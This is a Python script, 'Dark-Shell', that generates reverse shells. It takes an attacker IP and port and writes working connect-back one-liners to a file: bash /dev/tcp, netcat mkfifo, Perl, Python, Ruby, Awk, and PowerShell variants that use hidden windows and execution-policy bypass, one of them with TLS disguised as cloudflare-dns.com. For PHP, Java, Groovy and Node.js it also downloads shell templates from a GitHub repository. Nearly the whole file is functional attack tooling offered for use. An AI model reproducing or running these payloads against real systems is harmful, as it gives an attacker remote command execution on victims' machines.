#!/usr/bin/env python3
from colorit import *
init_colorit()
import socket
import fcntl
import struct
import requests
import sys
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter

PURPLE = 145,31,186
DEEPPINK=255,20,147
CYAN=0,238,238
WHITE=255, 255, 255
RED=255,0,0

print(color("""
    _____             _           _____ _          _ _ 
    |  __ \           | |         / ____| |        | | |
    | |  | | __ _ _ __| | _______| (___ | |__   ___| | |
    | |  | |/ _` | '__| |/ /______\___ \| '_ \ / _ \ | |
    | |__| | (_| | |  |   <       ____) | | | |  __/ | |
    |_____/ \__,_|_|  |_|\_\     |_____/|_| |_|\___|_|_|     

Drink Coffe, Enjoy Generate Shell                  by 0xPwn1 - V1.2                                                                                                 
""",(PURPLE)))


languages = [
     "Bash", "Mfikto", "Perl", "Perl-No-Sh", "Php", "Rustcat", "Python",
    "Netcat", "Powershell", "Ruby", "Java", "Groovy", "Awk", "Nodejs",
]

PowerShell = [
    "Powershell-1","Powershell-2","Powershell-3","Powershell-4"
]

Python = [
    "Python", "Python2", "Python3"
]

PHP = [
    "php",            "php1",         "php2",
    "php3",           "php4",         "php5",
    "php6",           "php7",        "php8",
    "php9",           "phtml",        "phar",
]

# Create a custom completer with language shortcuts
completer  = WordCompleter(languages, ignore_case=True)
completer1 = WordCompleter(PowerShell, ignore_case=True)
completer2 = WordCompleter(Python, ignore_case=True)
completer3 = WordCompleter(PHP, ignore_case=True)


def get_ip_address(interface):
    try:
        # Check if the input is already an IP address
        socket.inet_aton(interface)
        return interface
    except socket.error:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ip_address = socket.inet_ntoa(fcntl.ioctl(
                sock.fileno(),
                0x8915,  # SIOCGIFADDR
                struct.pack('256s', bytes(interface[:15], 'utf-8'))
            )[20:24])
            return ip_address
        except IOError:
            return None

if __name__ == "__main__":
    while True:
        interface_name = input("Enter IP or Name-Interface: ")
        ip_address = get_ip_address(interface_name)
        if ip_address is not None:
            IP = ip_address
            break
        else:
            print(color("==> Incorrect Interface!!!", RED))


PORT = input("[~] Enter Your PORT: ")
FILE_NAME = input("[~] Enter Name File (Without Extension): ")
#EXTENSION = input("Enter Your FORMAT: ").lower()
print("  ~) -"+color(" Bash        ",(CYAN))+"  ~) - "+color("Mfikto",(CYAN)))
print("  ~) -"+color(" Perl        ",(CYAN))+"  ~) - "+color("Perl-No-Sh",(CYAN)))
print("  ~) -"+color(" Php         ",(CYAN))+"  ~) - "+color("Rustcat",(CYAN)))
print("  ~) -"+color(" Python      ",(CYAN))+"  ~) - "+color("Netcat",(CYAN)))
print("  ~) -"+color(" Powershell  ",(CYAN))+"  ~) - "+color("Ruby",(CYAN)))
print("  ~) -"+color(" Java        ",(CYAN))+"  ~) - "+color("Groovy",(CYAN)))
print("  ~) -"+color(" Awk         ",(CYAN))+"  ~) - "+color("Nodejs",(CYAN)))
print("\n")


EXTENSION = prompt("Choose Your Language: ", completer=completer).lower()

# Define the URL of the remote file
url = "https://github.com/HIJACKED1/Reverse-Shells/raw/main/reverse-shell.php"
url1 = "https://github.com/HIJACKED1/Reverse-Shells/raw/main/Shell.groovy"
url2 = "https://github.com/HIJACKED1/Reverse-Shells/blob/main/node.js"
url3 = "https://github.com/HIJACKED1/Reverse-Shells/raw/main/shell.java"

# Define a dictionary for different shell commands
shell_commands = {
    "awk": 'awk \'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null' % (IP, PORT),
    "ruby": 'ruby -rsocket -e \'spawn("sh",[:in,:out,:err]=>TCPSocket.new("%s",%s))\'' % (IP, PORT),
    "rustcat": "rcat {} {} -r undefined".format(IP, PORT),
    "bash": "bash -i >& /dev/tcp/{}/{} 0>&1".format(IP, PORT),
    "mfikto": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {} {} >/tmp/f".format(IP, PORT),
    "netcat": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(IP, PORT),
    "perl-no-sh": 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'' % (IP, PORT),
    "perl": 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("undefined -i");}};\'' % (IP, PORT),
    "python": 'export RHOST="%s";export RPORT=%s;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
    "python2": 'export RHOST="%s";export RPORT=%s;python2.7 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
    "python3": 'export RHOST="%s";export RPORT=%s;python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
    "powershell-1": f'powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'{IP}\',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"',
    "powershell-2": f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient(\'{IP}\',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
    "powershell-3": f'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{IP}\', {PORT});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()}}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"',
    "powershell-4": f'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{IP}\', {PORT}); $NetworkStream = $TCPClient.GetStream(); $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({{$true}} -as [Net.Security.RemoteCertificateValidationCallback])); $SslStream.AuthenticateAsClient(\'cloudflare-dns.com\', $null, $false); if (!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{ $SslStream.Close(); exit }} $StreamWriter = New-Object IO.StreamWriter($SslStream); function WriteToStream ($String) {{ [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{ 0 }}; $StreamWriter.Write($String + \'SHELL> \'); $StreamWriter.Flush() }}; WriteToStream ''; while (($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{ $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try {{ Invoke-Expression $Command 2>&1 | Out-String }} catch {{ $_ | Out-String }} WriteToStream ($Output) }} $StreamWriter.Close()"'
}



# CHOOSING VERSION LANGUAGE 
if EXTENSION == "powershell":
    print("  ~) -"+color(" PowerShell-1         ",(CYAN))+"  ~) - "+color("Powershell-2",(CYAN)))
    print("  ~) -"+color(" PowerShell-3         ",(CYAN))+"  ~) - "+color("Powershell-4 (TLS 'not write TLS')",(CYAN)))
    print("\n")
    
    EX = prompt("What PowerShell Version are you using:: ", completer=completer1).lower()
    EXTENSION = EX

elif EXTENSION == "nodejs":
    response = requests.get(url2)
    if response.status_code == 200:
        # Get the content of the remote file
        remote_content = response.text
        # Replace the placeholders in the remote content with user input
        modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
        # Save the modified content to a local file
        file_path = "{}.{}".format(FILE_NAME,"js")
        with open(file_path, "w") as file:
            file.write(modified_content)
        print(f"The modified file has been saved as {file_path}")
    else:
        print(f"Failed to fetch content from {url2}. Status code: {response.status_code}")
    sys.exit()

elif EXTENSION == "java":
    response = requests.get(url3)
    if response.status_code == 200:
        # Get the content of the remote file
        remote_content = response.text
        # Replace the placeholders in the remote content with user input
        modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
        # Save the modified content to a local file
        file_path = "{}.{}".format(FILE_NAME,EXTENSION)
        with open(file_path, "w") as file:
            file.write(modified_content)
        print(f"The modified file has been saved as {file_path}")
    else:
        print(f"Failed to fetch content from {url}. Status code: {response.status_code}")
    sys.exit()

elif EXTENSION == "groovy":
    response = requests.get(url1)
    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        # Get the content of the remote file
        remote_content = response.text
        # Replace the placeholders in the remote content with user input
        modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
        # Save the modified content to a local file
        file_path = "{}.{}".format(FILE_NAME,EXTENSION)
        with open(file_path, "w") as file:
            file.write(modified_content)

        print(f"The modified file has been saved as {file_path}")
    else:
        print(f"Failed to fetch content from {url}. Status code: {response.status_code}")
    sys.exit()

elif EXTENSION == "python":
    print("  ~) -"+color(" Python         ",(CYAN))+"  ~) - "+color("Python2",(CYAN)))
    print("  ~) -"+color(" Python3         ",(CYAN)))
    print("\n")

    EX = prompt("What Python Version are you using: ", completer=completer2).lower()
    EXTENSION = EX

elif EXTENSION == "php":
    print("  ~) -"+color(" php          ",(CYAN))+"  ~) - "+color("php1",(CYAN))+"  ~) - "+color("php2",(CYAN)))
    print("  ~) -"+color(" php3         ",(CYAN))+"  ~) - "+color("php4",(CYAN))+"  ~) - "+color("php5",(CYAN)))
    print("  ~) -"+color(" php6         ",(CYAN))+"  ~) - "+color("php7",(CYAN))+"  ~) - "+color("php8",(CYAN)))
    print("  ~) -"+color(" php9         ",(CYAN))+"  ~) - "+color("phtml",(CYAN))+" ~) - "+color("phar",(CYAN)))
    print("\n")

    EX = prompt("What PHP Version are you using: ", completer=completer3).lower()
    response = requests.get(url)
    # Check if the request was successful (status code 200)
    if response.status_code == 200:
        # Get the content of the remote file
        remote_content = response.text
        # Replace the placeholders in the remote content with user input
        modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
        # Save the modified content to a local file
        file_path = "{}.{}".format(FILE_NAME,EX)
        with open(file_path, "w") as file:
            file.write(modified_content)

        print(f"The modified file has been saved as {file_path}")
    else:
        print(f"Failed to fetch content from {url}. Status code: {response.status_code}")
    sys.exit()

# Define a dictionary to map shell formats to file extensions
format_to_extension = {
    "python3": "sh",
    "python2": "sh",
    "bash": "sh",
    "perl": "pl",
    "python": "sh",
    "netcat": "sh",
    "perl-no-sh": "pl",
    "rustcat": "sh",
    "mfikto" : "sh",
    "netcat" : "sh",
    "powershell-1" : "ps1",
    "powershell-2":"ps2",
    "powershell-3" : "ps3",
    "powershell-4": "ps4",
    "awk":"awk",
    "ruby":"rb",
}


# Check if the entered format is in the dictionary
if EXTENSION in shell_commands:
    file_extension = format_to_extension.get(EXTENSION)
    if file_extension:
        file_path = "{}.{}".format(FILE_NAME,file_extension)
        with open(file_path, "w") as file:
            file.write(shell_commands[EXTENSION])
            print(f"The modified file has been saved as {file_path}")
    else:
        print("Unsupported shell format: {}".format(EXTENSION))
else:
    print("Unsupported shell format: {}".format(EXTENSION))
